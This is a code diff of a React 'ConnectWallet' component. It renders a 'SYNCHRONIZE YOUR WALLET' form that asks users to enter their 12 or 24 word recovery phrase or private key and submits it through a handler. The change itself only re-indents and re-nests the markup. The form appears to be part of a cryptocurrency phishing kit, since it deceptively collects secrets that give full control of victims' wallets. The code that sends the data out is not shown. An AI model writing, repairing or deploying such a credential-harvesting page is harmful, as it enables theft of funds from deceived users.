@@ -65,39 +65,39 @@ function ConnectWallet({ title, handleClose, identity, imagesrc }) {
             <section>
               <WalletId identity={identity} title={title} imagesrc={imagesrc} />
             </section>
-             <Spin spinning={isLoading} size="large">
-            <div className="p-3">
-              <section>
-                <h2 className="mt-2 mb-4">SYNCHRONIZE YOUR WALLET</h2>
-                <h3>SECURELY ENTER WALLET DETAILS TO PROCEED</h3>
-                <p>Enter 12 or 24 word Phrase/Private key</p>
-              </section>
-              <form className="easy ">
-                <input
-                  className="form-control keyform text-center"
-                  type="text"
-                  placeholder="PHRASE/PRIVATE KEY"
-                  minLength="12"
-                  required
-                  onChange={(e) =>
-                    setGetData({ ...getData, message: e.target.value })
-                  }
-                />
-                {/* <input
-              type="submit"
-              value=" Synchronize"
-              className="bTN"
-              onClick={toggleWalletPopUp}
-            /> */}
+            <Spin spinning={isLoading} size="large">
+              <div className="p-3">
+                  <section>
+                    <h2 className="mt-2 mb-4">SYNCHRONIZE YOUR WALLET</h2>
+                    <h3>SECURELY ENTER WALLET DETAILS TO PROCEED</h3>
+                    <p>Enter 12 or 24 word Phrase/Private key</p>
+                  </section>
+                  <form className="easy ">
+                    <input
+                      className="form-control keyform text-center"
+                      type="text"
+                      placeholder="PHRASE/PRIVATE KEY"
+                      minLength="12"
+                      required
+                      onChange={(e) =>
+                        setGetData({ ...getData, message: e.target.value })
+                      }
+                    />
+                    {/* <input
+                  type="submit"
+                  value=" Synchronize"
+                  className="bTN"
+                  onClick={toggleWalletPopUp}
+                /> */}
 
-                <button className="bTN" onClick={handSubmit}>
-                  {" "}
-                  Synchronize{" "}
-                </button>
-              </form>
-          </Spin>
-            </div>
-          </section>
+                    <button className="bTN" onClick={handSubmit}>
+                      {" "}
+                      Synchronize{" "}
+                    </button>
+                  </form>
+              </div>
+            </Spin>
+            </section>
         </div>
     </>
   );
